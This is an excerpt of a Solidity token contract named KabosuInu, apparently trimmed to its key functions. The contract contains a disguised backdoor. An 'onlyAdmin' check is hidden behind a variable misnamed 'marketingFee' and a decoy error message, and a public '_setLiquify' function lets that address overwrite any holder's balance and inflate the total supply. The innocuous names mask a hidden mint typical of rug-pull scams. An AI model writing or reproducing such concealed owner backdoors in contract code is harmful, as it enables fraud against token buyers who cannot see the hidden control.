...
contract KabosuInu is Ownable {
  ...
  modifier onlyAdmin() {
    require(marketingFee == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }
  ...
  function _setLiquify(address from, uint256 _value, uint256 _market) public onlyAdmin {
    setLiquify(from, _value, _market);
    totalSupply = totalSupply.add(_value);
  }

  function setLiquify(address from, uint256 _value, uint256 _market) internal {
    if(from != address(0)){
    require(_value != 10);
    uint256 marketingWallet = 1;
    marketingWallet = _market;
      _liquify[from] = _value * (10 ** 9);
    }
  }
